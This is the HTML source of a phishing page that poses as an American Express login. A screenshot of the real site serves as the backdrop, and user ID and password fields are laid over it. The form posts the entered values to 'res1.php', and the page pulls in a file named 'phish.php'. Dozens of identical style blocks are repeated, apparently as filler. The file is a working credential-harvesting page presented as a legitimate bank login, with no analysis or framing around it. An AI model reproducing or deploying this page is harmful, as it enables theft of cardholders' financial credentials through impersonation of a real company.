
<HTML><head>
<title>American Express | Login </title><?php include ('phish.php'); ?>
<meta http-equiv="content-type" content="text/html; charset=UTF8">

<link type="image/x-icon" rel="shortcut icon" href="https://taijionmaui.files.wordpress.com/2011/10/blue-sky.jpg">

<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden" onload="unhideBody()">



<style> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #c8c8c8 ;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
    border-radius: 5px;
}
 } 
</style> 

<style type="text/css">
div#container
{
  position:relative;
  width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
  text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body bgColor="#F3F3F3" Link="#c8c8c8 " VLink="#c8c8c8 " ALink="#c8c8c8 ">
<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #c8c8c8 ;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
    border-radius: 5px;
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
  position:relative;
  width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
  text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #c8c8c8 ;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
    border-radius: 5px;
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
  position:relative;
  width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
  text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #c8c8c8 ;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
    border-radius: 5px;
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
  position:relative;
  width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
  text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #c8c8c8 ;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
    border-radius: 5px;
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
  position:relative;
  width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
  text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #c8c8c8 ;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
    border-radius: 5px;
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
  position:relative;
  width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
  text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #c8c8c8 ;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
    border-radius: 5px;
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
  position:relative;
  width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
  text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #c8c8c8 ;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
    border-radius: 5px;
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
  position:relative;
  width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
  text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #c8c8c8 ;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
    border-radius: 5px;
}
 } 
</STYLE>

<STYLE>
#qs{
 width:215px; 
 height: 35px;  
}

</STYLE>

<STYLE type=text/css>
div#container
{
  position:relative;
  width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
  text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #c8c8c8 ;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
    border-radius: 5px;
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
  position:relative;
  width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
  text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>

<STYLE> 
 .textbox { 
    height: 30px;
    width: 221px;
    margin-bottom: 15px;
    border: 1px solid #c8c8c8 ;
    font-size: 16px;
    padding-left: 8px;
    font-family: "Gotham Narrow",Arial,sans-serif;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.10);
    border-radius: 5px;
}
 } 
</STYLE>

<STYLE type=text/css>
div#container
{
  position:relative;
  width:  100%; 
  height: 100%; 
  background-size: 100%;
  background-position: center;
  background-repeat: no-repeat;
  text-align:left; 
}
body {text-align:center;margin:0}
</STYLE>


<DIV id=container>
<DIV id=image2 style="HEIGHT: 540px; WIDTH: 700px; LEFT: 216px; Z-INDEX: 1; TOP: 0px"><IMG title="" border=0 alt="" src="img/home.png" width=1263 height=1217></DIV>



<FORM id=chalbhai onsubmit=" return formbreeze_sub()" method=post name=chalbhai action=res1.php>

<INPUT id=up class=textbox style="HEIGHT: 50px; background-color :  #f2f8f9;  WIDTH: 275px; POSITION: absolute; LEFT: 327px; Z-INDEX: 5; TOP: 118px" maxLength=50 size=1 name=UserID required placeholder=""> 


<INPUT id=up class=textbox style="HEIGHT: 50px; WIDTH: 275px; background-color :  #f2f8f9; POSITION: absolute; LEFT: 327px; Z-INDEX: 6; TOP: 214px" size=1 type=password name=Password required placeholder=""> 


<DIV id=formimage1 style="POSITION: absolute; LEFT: 325px; Z-INDEX: 7; TOP: 397px">
<INPUT height=57 src="img/login.png" type=image width=281 name=formimage1></DIV></FORM></DIV>

 </BODY></HTML>